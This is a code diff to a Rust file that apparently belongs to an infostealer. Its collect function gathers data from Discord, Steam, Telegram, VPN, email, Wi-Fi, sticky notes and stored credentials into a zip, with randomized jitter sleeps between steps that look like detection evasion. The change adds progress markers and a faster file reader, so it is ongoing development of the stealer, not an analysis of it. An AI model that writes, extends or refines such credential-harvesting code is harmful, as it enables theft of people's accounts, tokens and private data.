@@ -15,7 +15,7 @@ use aes_gcm::aead::{Aead, KeyInit};
 use aes_gcm::{Aes256Gcm, Nonce};
 use base64::Engine;
 
-use crate::fsutil::{read_file, walk_files};
+use crate::fsutil::{read_file_quick as read_file, walk_files};
 use crate::info::Info;
 use crate::resolve::resolve;
 use crate::zipw::ZipBuilder;
@@ -1688,20 +1688,32 @@ fn collect_sticky_notes(zip: &mut ZipBuilder, info: &mut Info) {
 
 pub fn collect(zip: &mut ZipBuilder, info: &mut Info) {
     collect_discord(zip, info);
+    crate::progress("apps:steam");
     collect_steam(zip, info);
+    crate::progress("apps:telegram");
     collect_telegram(zip, info);
+    crate::progress("apps:loose");
     collect_loose(zip, info);
+    crate::progress("apps:gaming");
     collect_gaming(zip, info);
     crate::jitter::sleep_jitter(20, 80);
+    crate::progress("apps:messaging");
     collect_messaging(zip, info);
     crate::jitter::sleep_jitter(20, 80);
+    crate::progress("apps:vpn");
     collect_vpn(zip, info);
     crate::jitter::sleep_jitter(20, 80);
+    crate::progress("apps:email");
     collect_email(zip, info);
     crate::jitter::sleep_jitter(20, 80);
+    crate::progress("apps:remote_misc");
     collect_remote_misc(zip, info);
     crate::jitter::sleep_jitter(20, 80);
+    crate::progress("apps:sticky_notes");
     collect_sticky_notes(zip, info);
+    crate::progress("apps:wifi");
     collect_wifi(zip, info);
+    crate::progress("apps:credentials");
     collect_credentials(zip, info);
+    crate::progress("apps:done");
 }
